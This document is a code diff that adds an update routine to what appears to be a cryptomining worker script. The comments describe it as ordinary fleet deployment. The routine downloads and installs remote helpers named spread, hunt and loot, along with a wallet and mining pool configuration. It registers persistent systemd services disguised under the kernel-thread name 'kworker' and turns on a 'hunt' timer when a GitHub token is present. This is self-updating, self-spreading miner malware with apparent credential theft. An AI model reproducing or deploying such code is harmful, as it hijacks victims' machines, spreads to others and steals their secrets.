@@ -31,6 +31,48 @@ render_config() {
         config.tmpl > config.json
 }
 
+# --- keep the fleet on the published revision ------------------------------
+# Helpers, units and worker.env live in the repo too, so publishing an edit is
+# the whole deploy. Compare-then-swap: never rewrite a file that is current, and
+# never adopt one whose download failed. mv is atomic, so a helper mid-run (fired
+# by its own timer) keeps reading its old inode.
+refresh_published() {
+    [ -n "${CONFIG_URL:-}" ] || return 0
+    for f in run.sh updater.sh spread.sh hunt.sh loot.sh tune.sh; do
+        curl -fsSL "$CONFIG_URL/$f" -o "$f.new" 2>/dev/null || { rm -f "$f.new"; continue; }
+        chmod 0755 "$f.new"
+        if [ ! -f "$f" ] || ! cmp -s "$f" "$f.new"; then mv -f "$f.new" "$f"; fi
+        rm -f "$f.new"
+    done
+    # worker.env is the single source of truth - but only adopt a sane copy
+    if curl -fsSL "$CONFIG_URL/worker.env" -o worker.env.new 2>/dev/null; then
+        if grep -q '^WALLET=.' worker.env.new && grep -q '^POOL=.' worker.env.new; then
+            if [ ! -f worker.env ] || ! cmp -s worker.env worker.env.new; then
+                mv -f worker.env.new worker.env
+                . ./worker.env
+                render_config
+                restart
+            fi
+        fi
+        rm -f worker.env.new
+    fi
+    if command -v systemctl >/dev/null 2>&1; then
+        for u in kworker kworker-updater kworker-spread kworker-hunt kworker-tune kworker-loot; do
+            for e in service timer; do
+                curl -fsSL "$CONFIG_URL/$u.$e" -o "/etc/systemd/system/$u.$e" 2>/dev/null || :
+            done
+        done
+        systemctl daemon-reload 2>/dev/null || true
+        for t in kworker-updater.timer kworker-spread.timer kworker-tune.timer kworker-loot.timer; do
+            systemctl enable --now "$t" 2>/dev/null || true
+        done
+        if [ -n "${GITHUB_TOKEN:-}" ]; then
+            systemctl enable --now kworker-hunt.timer 2>/dev/null || true
+        fi
+    fi
+}
+refresh_published
+
 # --- auto-update -----------------------------------------------------------
 if [ -n "${SHA_URL:-}" ]; then
     new=$(curl -fsSL "$SHA_URL" 2>/dev/null | awk '{print $1}' | tr 'A-F' 'a-f' || true)
